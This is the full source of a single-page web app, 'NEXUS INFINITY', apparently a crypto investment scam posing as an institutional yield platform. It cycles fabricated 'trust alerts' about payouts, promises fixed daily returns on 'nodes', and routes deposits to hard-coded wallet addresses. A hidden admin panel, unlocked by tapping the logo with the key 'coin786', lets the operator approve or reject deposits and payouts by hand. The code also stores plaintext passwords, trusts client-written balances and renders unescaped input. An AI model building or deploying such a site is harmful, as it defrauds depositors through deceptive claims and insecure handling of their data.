<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS INFINITY | Global Institutional Terminal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;500;700;800&family=Syncopate:wght@700&display=swap');
        
        :root { 
            --neon-pink: #ff00ff; 
            --neon-red: #ff003c;
            --glass: rgba(10, 10, 10, 0.95);
        }

        body { 
            background: #050505; 
            color: #f8f9fa; 
            font-family: 'Plus Jakarta Sans', sans-serif; 
            margin: 0; 
            overflow-x: hidden; 
        }

        /* Professional Background for Login/Signup */
        .auth-bg { 
            background: linear-gradient(135deg, rgba(5,5,5,0.85), rgba(255,0,60,0.15)), 
                        url('https://images.unsplash.com/photo-1639762681485-074b7f938ba0?auto=format&fit=crop&q=80&w=2000'); 
            background-size: cover; 
            background-position: center;
            background-attachment: fixed;
        }

        .glass-panel { 
            background: var(--glass); 
            backdrop-filter: blur(50px); 
            border: 1px solid rgba(255, 255, 255, 0.1); 
            border-radius: 40px; 
            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
        }

        .btn-master { 
            background: linear-gradient(90deg, var(--neon-red), var(--neon-pink)); 
            color: white; 
            font-weight: 800; 
            padding: 20px; 
            border-radius: 24px; 
            width: 100%; 
            transition: 0.4s ease; 
            text-transform: uppercase;
            letter-spacing: 2px;
            box-shadow: 0 10px 40px rgba(255, 0, 60, 0.3);
        }

        .btn-master:hover { transform: translateY(-3px); filter: brightness(1.2); }

        .input-hub { 
            background: rgba(255, 255, 255, 0.03); 
            border: 1px solid rgba(255, 255, 255, 0.08); 
            border-radius: 22px; 
            padding: 20px; 
            color: white; 
            width: 100%; 
            outline: none; 
            transition: 0.3s;
        }

        .input-hub:focus { border-color: var(--neon-pink); background: rgba(255, 0, 255, 0.02); }

        .nav-item { color: #555; text-align: center; cursor: pointer; transition: 0.3s; }
        .nav-active { color: var(--neon-pink); text-shadow: 0 0 15px var(--neon-pink); }
        .hidden { display: none !important; }

        /* Trust Alerts */
        #live-trust {
            position: fixed; top: 25px; left: 50%; transform: translateX(-50%);
            z-index: 10000; width: 90%; max-width: 350px; display: none;
            animation: slideDown 0.6s ease forwards;
        }
        @keyframes slideDown { from { transform: translate(-50%, -100px); opacity: 0; } to { transform: translate(-50%, 0); opacity: 1; } }
    </style>
</head>
<body>

    <div id="live-trust">
        <div class="glass-panel p-4 flex items-center gap-4 border-l-4 border-green-500">
            <div class="bg-green-500/20 p-2 rounded-full text-green-500"><i class="fa-solid fa-shield-check"></i></div>
            <p id="trust-text" class="text-[10px] font-black uppercase tracking-tighter"></p>
        </div>
    </div>

    <div id="splash" class="fixed inset-0 bg-[#050505] z-[9999] flex flex-col items-center justify-center">
        <div class="w-28 h-28 bg-gradient-to-tr from-[#ff003c] to-[#ff00ff] rounded-[2.8rem] flex items-center justify-center text-6xl font-black text-white shadow-2xl animate-pulse">N</div>
        <h1 style="font-family: 'Syncopate'" class="mt-10 text-sm tracking-[0.5em] text-white italic">NEXUS<span class="text-pink-500">INFINITY</span></h1>
        <p class="text-[8px] text-zinc-600 mt-6 font-black uppercase tracking-[0.3em]">Institutional Core Loading...</p>
    </div>

    <div id="auth-section" class="min-h-screen auth-bg flex items-center justify-center p-8 hidden">
        <div class="max-w-md w-full space-y-10">
            <div class="text-center space-y-3">
                <div id="logo-tap" class="w-24 h-24 bg-black mx-auto rounded-[2.5rem] flex items-center justify-center border-2 border-pink-500 shadow-2xl italic text-5xl font-black">N</div>
                <h2 style="font-family: 'Syncopate'" class="text-2xl font-black tracking-widest italic">NEXUS<span class="text-pink-500">INFINITY</span></h2>
                <p class="text-[9px] text-zinc-400 font-bold uppercase tracking-[0.4em]">Advanced Digital Asset Infrastructure</p>
            </div>

            <div id="login-ui" class="glass-panel p-10 space-y-6">
                <input type="text" id="l-user" placeholder="Terminal Account ID" class="input-hub">
                <input type="password" id="l-pass" placeholder="Encrypted Access Key" class="input-hub">
                <button onclick="handleLogin()" class="btn-master">Authorize Identity</button>
                <p onclick="toggleAuth(true)" class="text-center text-[10px] text-zinc-500 font-black uppercase cursor-pointer hover:text-white transition">Register Institutional Node</p>
            </div>

            <div id="signup-ui" class="glass-panel p-10 space-y-6 hidden">
                <input type="text" id="s-user" placeholder="Create Unique ID" class="input-hub">
                <input type="password" id="s-pass" placeholder="Generate Access Key" class="input-hub">
                <button onclick="handleSignup()" class="btn-master">Finalize Identity</button>
                <p onclick="toggleAuth(false)" class="text-center text-[10px] text-zinc-500 font-black uppercase cursor-pointer">Return to Hub</p>
            </div>
        </div>
    </div>

    <div id="dashboard" class="hidden pb-32">
        <header class="p-6 sticky top-0 bg-black/80 backdrop-blur-3xl z-50 border-b border-white/5 flex justify-between items-center">
            <div class="flex items-center gap-4">
                <div id="admin-trigger" class="w-12 h-12 bg-zinc-950 rounded-2xl flex items-center justify-center font-black border border-white/10 shadow-lg">N</div>
                <div>
                    <span id="nav-user" class="text-sm font-black italic text-pink-500 uppercase leading-none">...</span>
                    <span class="text-[8px] text-green-500 font-bold block mt-1 uppercase animate-pulse">● Grid Secure</span>
                </div>
            </div>
            <button onclick="logout()" class="text-zinc-600"><i class="fa-solid fa-power-off text-xl"></i></button>
        </header>

        <main id="page-core" class="p-6 space-y-6">
            <div class="glass-panel p-10 bg-gradient-to-br from-zinc-950 to-black overflow-hidden relative">
                <p class="text-[9px] font-black text-zinc-500 uppercase tracking-widest mb-1">Total Institutional Equity</p>
                <h2 id="balance-txt" class="text-5xl font-black italic tracking-tighter">$0.00</h2>
                <div class="mt-10 grid grid-cols-2 gap-4 border-t border-white/5 pt-8">
                    <div><p class="text-[7px] text-zinc-500 uppercase font-black mb-1">Yield Accumulation</p><p id="profit-txt" class="text-2xl font-black text-pink-500">+$0.00</p></div>
                    <div class="text-right"><p class="text-[7px] text-zinc-500 uppercase font-black mb-1">Active Nodes</p><p id="active-nodes-count" class="text-2xl font-black text-blue-400">0</p></div>
                </div>
            </div>
            <div id="active-nodes-list" class="grid gap-4"></div>
        </main>

        <main id="page-market" class="p-6 space-y-4 hidden">
            <h3 class="text-xl font-black italic text-pink-500 uppercase">Infrastructure Market</h3>
            <div id="market-list" class="grid gap-4"></div>
        </main>

        <main id="page-vault" class="p-6 space-y-8 hidden">
            <div class="glass-panel p-8 space-y-8">
                <h3 class="text-xl font-black italic text-pink-500 uppercase">Capital Injection</h3>
                
                <div class="space-y-4">
                    <div class="bg-black/50 p-5 rounded-3xl border border-white/5 space-y-2">
                        <div class="flex justify-between items-center"><span class="text-[8px] font-black text-zinc-600 uppercase">Trust Wallet / TRX</span><i class="fa-solid fa-wallet text-green-500"></i></div>
                        <p class="text-xs font-black text-white select-all break-all">TK1ZYaXdfabtqpEeYfRjcACeXnCrGoVx76</p>
                    </div>
                    <div class="bg-black/50 p-5 rounded-3xl border border-white/5 space-y-2">
                        <div class="flex justify-between items-center"><span class="text-[8px] font-black text-zinc-600 uppercase">Metamask / ETH</span><i class="fa-solid fa-circle-nodes text-blue-500"></i></div>
                        <p class="text-xs font-black text-white select-all break-all">0xD9359EADE5F5bACA51fb7da043767Bc0685bC355</p>
                    </div>
                    <div class="bg-black/50 p-5 rounded-3xl border border-white/5 space-y-2">
                        <div class="flex justify-between items-center"><span class="text-[8px] font-black text-zinc-600 uppercase">Binance / USDT</span><i class="fa-brands fa-bitcoin text-yellow-500"></i></div>
                        <p class="text-xs font-black text-white select-all break-all">TAvfQQ18hXHdVCHbExV4yUPvQ4XkNgfKsJ</p>
                    </div>
                </div>

                <div class="space-y-4 pt-4 border-t border-white/5">
                    <input type="number" id="dep-amt" placeholder="Amount ($)" class="input-hub">
                    <input type="text" id="dep-tid" placeholder="Transaction Hash (TID)" class="input-hub">
                    <div class="space-y-2">
                        <p class="text-[9px] text-zinc-500 font-black uppercase ml-2">Digital Signature (Proof)</p>
                        <input type="file" id="dep-proof" accept="image/*" class="text-[10px] text-zinc-500 block w-full file:bg-zinc-900 file:border-0 file:rounded-full file:px-4 file:py-2">
                        <img id="preview-img" class="mt-4 w-full h-32 rounded-3xl border border-pink-500/30 object-cover hidden">
                    </div>
                    <button onclick="submitDep()" class="btn-master">Authorize Injection</button>
                </div>
            </div>

            <div class="glass-panel p-8 space-y-6">
                <h3 class="text-xl font-black italic uppercase">Request Payout</h3>
                <div class="space-y-4">
                    <select id="w-method" class="input-hub bg-zinc-950">
                        <option value="Binance Pay">Binance Pay (ID)</option>
                        <option value="Trust Wallet">Trust Wallet (TRC20)</option>
                        <option value="Metamask">Metamask (ERC20)</option>
                        <option value="OKX">OKX Terminal</option>
                        <option value="Coinbase">Coinbase Wallet</option>
                        <option value="Bybit">Bybit Network</option>
                        <option value="KuCoin">KuCoin Node</option>
                        <option value="Bitget">Bitget Hub</option>
                    </select>
                    <input type="text" id="w-user" placeholder="Terminal Username" class="input-hub">
                    <input type="text" id="w-addr" placeholder="Destination Address / ID" class="input-hub">
                    <input type="number" id="w-amt" placeholder="Payout Amount ($)" class="input-hub">
                    <button onclick="submitWith()" class="btn-master !bg-zinc-800">Request Distribution</button>
                </div>
            </div>
        </main>

        <nav class="fixed bottom-0 left-0 right-0 p-6 bg-black/80 backdrop-blur-3xl border-t border-white/5 flex justify-around items-center z-[1000]">
            <div onclick="switchPage('core')" class="nav-item nav-active"><i class="fa-solid fa-shield-halved text-2xl mb-1"></i><p class="font-black uppercase text-[8px]">Core</p></div>
            <div onclick="switchPage('market')" class="nav-item"><i class="fa-solid fa-microchip text-2xl mb-1"></i><p class="font-black uppercase text-[8px]">Market</p></div>
            <div onclick="switchPage('vault')" class="nav-item"><i class="fa-solid fa-vault text-2xl mb-1"></i><p class="font-black uppercase text-[8px]">Vault</p></div>
        </nav>
    </div>

    <div id="admin-panel" class="fixed inset-0 bg-[#050505] z-[9999] p-8 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-10 border-b border-white/5 pb-6">
            <h2 class="text-2xl font-black italic text-pink-500">ADMIN OVERRIDE</h2>
            <button onclick="document.getElementById('admin-panel').classList.add('hidden')" class="text-4xl">&times;</button>
        </div>
        <div id="admin-requests" class="space-y-6"></div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, onValue, push, update, remove } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = { apiKey: "AIzaSyDaOGSlBjS7_pQX9ELAytXVF4jvWK_lzB0", authDomain: "live-54fb4.firebaseapp.com", databaseURL: "https://live-54fb4-default-rtdb.firebaseio.com", projectId: "live-54fb4", storageBucket: "live-54fb4.firebasestorage.app", messagingSenderId: "781910562842", appId: "1:781910562842:web:07a887f860d30fd17d99a3" };
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        // Unlimited Node Infrastructure (15+)
        const marketNodes = Array.from({length: 15}, (_, i) => ({
            id: i+1,
            title: i < 10 ? `Institutional S-0${i+1}` : `Apex Elite X-0${i-8}`,
            price: i < 10 ? (i+1)*20 : (i-8)*450,
            daily: i < 10 ? (i+1)*2.5 : (i-8)*65,
            days: i < 10 ? 30 : 60,
            tier: i < 10 ? 'Standard' : 'Elite'
        }));

        window.onload = () => {
            renderMarket();
            setInterval(showTrustAlert, 14000);
            setTimeout(() => {
                document.getElementById('splash').style.display = 'none';
                const user = localStorage.getItem('nexus_user');
                if(user) showDashboard(user);
                else document.getElementById('auth-section').classList.remove('hidden');
            }, 3000);
        };

        const trustMessages = ["Terminal ID 482x settled $340.00 via Binance Pay", "New Node S-09 Deployed successfully", "Capital Injection Authorized: $1,200.00", "System Audit complete: 100% Stability", "User ID 109x requested payout of $500.00"];
        function showTrustAlert() {
            const box = document.getElementById('live-trust');
            document.getElementById('trust-text').innerText = trustMessages[Math.floor(Math.random()*trustMessages.length)];
            box.style.display = 'block';
            setTimeout(() => box.style.display = 'none', 5000);
        }

        function renderMarket() {
            document.getElementById('market-list').innerHTML = marketNodes.map(n => `
                <div class="glass-panel p-6 flex justify-between items-center ${n.tier === 'Elite' ? 'border-pink-500/40' : ''}">
                    <div><p class="text-[7px] font-black text-zinc-500 uppercase mb-1">${n.tier} Node</p><h4 class="text-xl font-black italic tracking-tighter">${n.title}</h4><p class="text-[10px] font-bold text-green-500">Yield: $${n.daily}/Day • ${n.days} Days</p></div>
                    <div class="text-right"><p class="text-xl font-black">$${n.price}</p><button onclick="buyNode(${n.id})" class="bg-white text-black px-6 py-2 rounded-2xl text-[9px] font-black mt-2 uppercase">Deploy</button></div>
                </div>`).join('');
        }

        window.buyNode = async (id) => {
            const user = localStorage.getItem('nexus_user'), node = marketNodes.find(x => x.id === id), snap = await get(ref(db, `users/${user}`));
            if((snap.val().balance || 0) < node.price) return alert("Insufficient Capital!");
            const start = Date.now();
            await update(ref(db, `users/${user}`), { balance: snap.val().balance - node.price });
            await set(push(ref(db, `users/${user}/nodes`)), { ...node, startTime: start, expires: start + (node.days * 86400000), lastClaim: start });
            alert("Infrastructure Successfully Deployed!"); switchPage('core');
        };

        function showDashboard(uid) {
            document.getElementById('auth-section').classList.add('hidden');
            document.getElementById('dashboard').classList.remove('hidden');
            document.getElementById('nav-user').innerText = uid;
            onValue(ref(db, `users/${uid}`), (snap) => {
                const data = snap.val(); if(!data) return;
                document.getElementById('balance-txt').innerText = '$' + (data.balance || 0).toLocaleString();
                document.getElementById('profit-txt').innerText = '+$' + (data.profit || 0).toLocaleString();
                const nodes = data.nodes ? Object.entries(data.nodes) : [];
                document.getElementById('active-nodes-count').innerText = nodes.length;
                document.getElementById('active-nodes-list').innerHTML = nodes.map(([k, n]) => {
                    const rem = Math.max(0, n.expires - Date.now()), hours = Math.floor(rem / 3600000);
                    if(Date.now() - n.lastClaim >= 86400000) {
                        update(ref(db, `users/${uid}`), { profit: (data.profit || 0) + n.daily });
                        update(ref(db, `users/${uid}/nodes/${k}`), { lastClaim: Date.now() });
                    }
                    return `<div class="glass-panel p-6 border-l-4 border-blue-500 flex justify-between items-center"><div class="space-y-1"><p class="text-xs font-black italic uppercase">${n.title}</p><p class="text-[9px] text-zinc-500 font-bold">Yielding: $${n.daily}/Day</p></div><div class="text-right"><p class="text-[8px] font-black text-blue-500 animate-pulse">● ONLINE</p><p class="text-[7px] text-zinc-400 mt-2">${hours}H Remaining</p></div></div>`;
                }).join('') || '<p class="text-center opacity-20 py-20 uppercase font-black text-[10px]">No Infrastructure Deployed</p>';
            });
        }

        window.submitDep = async () => {
            const user = localStorage.getItem('nexus_user'), amt = document.getElementById('dep-amt').value, tid = document.getElementById('dep-tid').value, proof = document.getElementById('preview-img').src;
            if(!amt || !tid || !proof) return alert("Protocol Data Missing!");
            const hRef = push(ref(db, `users/${user}/history`));
            const entry = { user, amount: amt, tid, proof, status: 'pending', date: new Date().toLocaleString(), type: 'Deposit', hKey: hRef.key };
            await set(hRef, entry); await set(ref(db, 'admin/requests/' + hRef.key), entry);
            alert("Injection Request Initialized.");
        };

        window.manage = async (adminKey, user, amt, hKey, action) => {
            if(action === 'approve') {
                const snap = await get(ref(db, `users/${user}`));
                await update(ref(db, `users/${user}`), { balance: (snap.val().balance || 0) + parseFloat(amt) });
                await update(ref(db, `users/${user}/history/${hKey}`), { status: 'Approved' });
            } else {
                await update(ref(db, `users/${user}/history/${hKey}`), { status: 'Rejected' });
            }
            await remove(ref(db, 'admin/requests/' + adminKey)); alert('Update Complete.');
        };

        function loadAdmin() {
            onValue(ref(db, 'admin/requests'), (snap) => {
                const d = snap.val();
                document.getElementById('admin-requests').innerHTML = d ? Object.entries(d).map(([id, l]) => `
                    <div class="glass-panel p-6 space-y-5 border border-pink-500/20">
                        <div class="flex justify-between items-center"><span class="text-[9px] font-black text-pink-500 uppercase">${l.type}</span><span class="text-[8px] text-zinc-600">${l.date}</span></div>
                        <p class="text-xs">User: <span class="font-black italic">${l.user}</span> | Amt: <span class="text-green-500 font-black">$${l.amount}</span></p>
                        ${l.proof ? `<img src="${l.proof}" class="w-full h-40 object-cover rounded-3xl border border-white/5" onclick="window.open(this.src)">` : `<p class="text-[10px]">${l.address}</p>`}
                        <div class="grid grid-cols-2 gap-4"><button onclick="manage('${id}','${l.user}',${l.amount},'${l.hKey}','approve')" class="bg-green-600 py-4 rounded-2xl text-[10px] font-black uppercase">Approve</button><button onclick="manage('${id}','${l.user}',${l.amount},'${l.hKey}','reject')" class="bg-red-600 py-4 rounded-2xl text-[10px] font-black uppercase">Reject</button></div>
                    </div>`).join('') : '<p class="text-center opacity-30 py-20 uppercase font-black text-[10px]">Grid Clean</p>';
            });
        }

        document.getElementById('dep-proof').onchange = (e) => { const r = new FileReader(); r.readAsDataURL(e.target.files[0]); r.onload = () => { document.getElementById('preview-img').src = r.result; document.getElementById('preview-img').classList.remove('hidden'); }; };
        let taps = 0; document.getElementById('admin-trigger').onclick = () => { taps++; if(taps === 4) { if(prompt("Key:") === "coin786") { document.getElementById('admin-panel').classList.remove('hidden'); loadAdmin(); } taps = 0; } };
        window.switchPage = (p) => { ['core','market','vault'].forEach(x => document.getElementById('page-'+x).classList.add('hidden')); document.getElementById('page-'+p).classList.remove('hidden'); document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('nav-active')); event.currentTarget.classList.add('nav-active'); };
        window.handleLogin = async () => { const u = document.getElementById('l-user').value.trim(), p = document.getElementById('l-pass').value.trim(), snap = await get(ref(db, `users/${u}`)); if(snap.exists() && snap.val().password === p) { localStorage.setItem('nexus_user', u); showDashboard(u); } else alert("Access Denied!"); };
        window.handleSignup = async () => { const u = document.getElementById('s-user').value.trim(), p = document.getElementById('s-pass').value.trim(); await set(ref(db, `users/${u}`), { username: u, password: p, balance: 0, profit: 0 }); alert("Identity Authorized!"); toggleAuth(false); };
        window.toggleAuth = (s) => { document.getElementById('login-ui').classList.toggle('hidden', s); document.getElementById('signup-ui').classList.toggle('hidden', !s); };
        window.logout = () => { localStorage.clear(); location.reload(); };
        window.submitWith = async () => { const u = localStorage.getItem('nexus_user'), amt = document.getElementById('w-amt').value, addr = document.getElementById('w-addr').value, method = document.getElementById('w-method').value; if(!amt || !addr) return alert("Details Required!"); const hRef = push(ref(db, `users/${u}/history`)); await set(hRef, { user: u, amount: amt, address: addr, method, status: 'pending', date: new Date().toLocaleString(), type: 'Withdrawal', hKey: hRef.key }); await set(ref(db, 'admin/requests/' + hRef.key), { user: u, amount: amt, address: addr, method, status: 'pending', date: new Date().toLocaleString(), type: 'Withdrawal', hKey: hRef.key }); alert("Payout Request Queued."); };
    </script>
</body>
</html>
